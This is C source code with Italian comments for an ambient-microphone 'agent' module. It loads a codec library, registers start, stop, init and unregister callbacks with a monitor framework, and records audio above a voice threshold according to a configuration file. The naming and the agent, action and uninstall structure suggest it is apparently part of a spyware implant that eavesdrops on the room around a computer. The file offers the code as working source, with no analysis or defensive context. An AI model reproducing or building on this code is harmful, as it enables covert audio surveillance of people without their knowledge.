#include "HM_MicAgent/QAmbientalMicrophone.h"

HMODULE amb_codec_handle = NULL; // Handle alla dll del codec
BOOL bPM_AmbMicStarted = FALSE; // Flag che indica se il monitor e' attivo o meno

#define DEF_VOICE_TSLD 220 // Soglia della voce
#define DEF_SILENCE_TIME 1 // Numero di chunk da 5 secondi di silenzio
#define DEF_MIC_CALIBRATION FALSE // Calibrazione micforno

UINT amb_mic_voice_tsld = DEF_VOICE_TSLD;
INT amb_mic_silence_time = DEF_SILENCE_TIME;
BOOL  amb_mic_calibration = DEF_MIC_CALIBRATION;

typedef struct {
	BOOL calibration;
	INT silence_time;
	UINT voice_tsld;
} ambmic_conf_struct;


DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
{
	char codec_path[DLLNAMELEN];
	static QAmbientalMicrophone *AmbMicObj = NULL;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_AmbMicStarted == bStartFlag)
		return 0;

	bPM_AmbMicStarted = bStartFlag;

	if (bStartFlag) {
		// Cerca di caricare il codec
		if (!amb_codec_handle)
			amb_codec_handle = 	LoadLibrary(HM_CompletePath(H4_CODEC_NAME, codec_path));

		// ...e inizia a registrare
		AmbMicObj = new QAmbientalMicrophone(amb_codec_handle, amb_mic_calibration, amb_mic_voice_tsld, amb_mic_silence_time);
	} else {
		// Finisce la registrazione e dealloca le strutture
		if (AmbMicObj) {
			delete AmbMicObj;
			AmbMicObj = NULL;
		}
	}

	return 1;
}

DWORD __stdcall PM_AmbMicInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	ambmic_conf_struct *ambmic_conf;

	// Legge configurazioni dal file
	if (conf_ptr) {
		ambmic_conf = (ambmic_conf_struct *)conf_ptr;
		amb_mic_voice_tsld = ambmic_conf->voice_tsld;
		amb_mic_silence_time = ambmic_conf->silence_time;
		amb_mic_calibration = ambmic_conf->calibration;
	} else {
		amb_mic_voice_tsld = DEF_VOICE_TSLD;
		amb_mic_silence_time = DEF_SILENCE_TIME;
		amb_mic_calibration = DEF_MIC_CALIBRATION;
	}

	PM_AmbMicStartStop(bStartFlag, TRUE);
	return 1;
}

DWORD __stdcall PM_AmbMicUnregister()
{
#define MAX_FREE_TRIES 5
#define FREE_SLEEP_TIME 100
	DWORD i;
	if (amb_codec_handle) {
		// Cerca a tutti i costi di chiudere la libreria
		// (anche se dovrebbe riuscire al primo tentativo)
		for (i=0; i<MAX_FREE_TRIES; i++) {
			// Non ci sono race sulla libreria visto che il thread e' morto
			// dopo la delete dello Stop, e la Start (dove
			// carica la libreria) viene sempre eseguita da una action (cosi' 
			// come la unregister che e' esguita dall'action uninstall).
			if (FreeLibrary(amb_codec_handle))
				break;
			Sleep(FREE_SLEEP_TIME);
		}
		amb_codec_handle = NULL;
	}
	return 1;
}


void PM_AmbMicRegister()
{
	// Non ha nessuna funzione di Dispatch
	AM_MonitorRegister(PM_AMBMICAGENT, NULL, (BYTE *)PM_AmbMicStartStop, (BYTE *)PM_AmbMicInit, (BYTE *)PM_AmbMicUnregister);

	// Inizialmente i monitor devono avere una configurazione di default nel caso
	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
	PM_AmbMicInit(NULL, FALSE);
}